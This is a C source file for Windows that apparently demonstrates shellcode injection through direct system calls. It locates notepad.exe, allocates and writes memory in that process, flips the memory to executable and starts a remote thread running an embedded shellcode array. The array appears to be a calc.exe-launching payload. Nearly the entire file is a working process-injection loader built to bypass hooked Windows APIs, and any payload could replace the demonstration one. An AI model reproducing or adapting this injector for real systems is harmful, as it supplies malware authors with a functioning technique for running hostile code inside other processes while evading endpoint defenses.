#include "DirectInject.h"
#include "syscalls.h"
#include <stdio.h>
#include <TlHelp32.h>

// calc
unsigned char joker[] = {
"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
"\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
"\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
"\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
"\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
"\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
"\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
"\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
"\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
"\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
"\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
"\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
"\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
"\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
"\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b"
"\x6f\x87\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd"
"\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
"\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00"
};
SIZE_T joker_len = sizeof(joker);

// Debug Symbols
char ok[6] = "\n(+)";
char in[6] = "\n\t(*)";
char err[6] = "\n(-)";
char ar[12] = "---------->";

int FindTarget(LPCWSTR procname) {
    HANDLE hProcSnap;
    PROCESSENTRY32 pe32;
    int pid = 0;

    hProcSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

    if (hProcSnap == INVALID_HANDLE_VALUE) {
        printf("%s Failed to take snapshot, error: %ld", err, GetLastError());

        return EXIT_FAILURE;
    }

    pe32.dwSize = sizeof(PROCESSENTRY32);

    if (!Process32First(hProcSnap, &pe32)) {

        printf("%s Failed to parse snapshot, error: %ld", err, GetLastError());
        CloseHandle(hProcSnap);
        return EXIT_FAILURE;
    }

    while (Process32Next(hProcSnap, &pe32)) {
        if (lstrcmpW(pe32.szExeFile, procname) == 0) {
            pid = pe32.th32ProcessID;
            break;
        }
    }
    CloseHandle(hProcSnap);
    return pid;
}


int wmain(int argc, wchar_t* argv[]) {
	
	/*if (argc != 2 || !argv[1] || argv[1] == NULL) {
		printf("%s Usage: %s <process name>", err, argv[0]);
		return EXIT_FAILURE;
	}*/

    NTSTATUS status;
    HANDLE hProc, hThread;
    LPVOID rBaseAddress;
    CLIENT_ID ClientId;
    OBJECT_ATTRIBUTES ObjectAttributes;
    ULONG OldProtect = NULL;

    //LPCWSTR procname = argv[1];
    LPCWSTR procname = L"notepad.exe";

    DWORD pid = FindTarget(procname);
    if (pid == 0 || pid == EXIT_FAILURE) {
        printf("%s Failed to find pid for %ls, are you sure its running?", err, procname);
        return EXIT_FAILURE;
    }

    printf("%s Retrieved pid for %ls: %d", ok, procname, pid);

    ClientId = { (HANDLE)pid, NULL };
    ObjectAttributes = { sizeof(ObjectAttributes) };

    status = NtOpenProcess(&hProc, PROCESS_ALL_ACCESS, &ObjectAttributes, &ClientId);
    if (!hProc || hProc == NULL || status != 0) {
        printf("%s Failed to open handle to %s [%d], error: %ld", ok, procname, pid, GetLastError());
        return EXIT_FAILURE;
    }

    printf("%s NtOpenProcess() %s Got handle to %s [%d]", ok, ar, procname, pid);
    
    status = NtAllocateVirtualMemory(hProc, &rBaseAddress, 0, &joker_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    printf("%s NtAllocateVirtualMemory() %s Allocated %zu bytes in %s %s 0x%lp", ok, ar, joker_len, procname, ar, rBaseAddress);


    status = NtWriteVirtualMemory(hProc, rBaseAddress, joker, sizeof(joker), NULL);
    printf("%s NtWriteVirtualMemory() %s Wrote %zu bytes in %s", ok, ar, sizeof(joker), procname);

    status = NtProtectVirtualMemory(hProc, &rBaseAddress, &joker_len, PAGE_EXECUTE_READ, &OldProtect);
    if (!OldProtect || OldProtect == NULL) {
        printf("%s NtProtectVirtualMemory() Failed to change memory protection at 0x%p from PAGE_READWRITE to PAGE_EXECUTEREAD, error: %ld", err, rBaseAddress, GetLastError());
        return EXIT_FAILURE;
    }
    printf("%s NtProtectVirtualMemory() %s Changed memory protection at 0x%p from PAGE_READWRITE to PAGE_EXECUTE_READ", ok, ar, rBaseAddress);

    status = NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, &ObjectAttributes, hProc, rBaseAddress, NULL, 0, 0, 0, 0, NULL);
    if (!hThread || hThread == NULL) {
        printf("%s Failed to create thread, error: %ld", err, GetLastError());
        return EXIT_FAILURE;
    }
    printf("%s NtCreateThreadEx() %s Created thread at 0x%p", ok, ar, rBaseAddress);

    printf("%s WaitForSingleObject() %s Waiting for execution to complete...", in, ar);
    WaitForSingleObject(hThread, INFINITE);
    printf("%s WaitForSingleObject() %s Thread execution complete", in, ar);

    printf("%s Cleaning up...", ok);
    NtClose(hThread);
    printf("%s NtClose() %s Closed handle to thread", ok, ar);
    NtClose(hProc);
    printf("%s NtClose() %s Closed handle to %s", ok, ar, procname);

    printf("%s Done", ok);

    return EXIT_SUCCESS;
}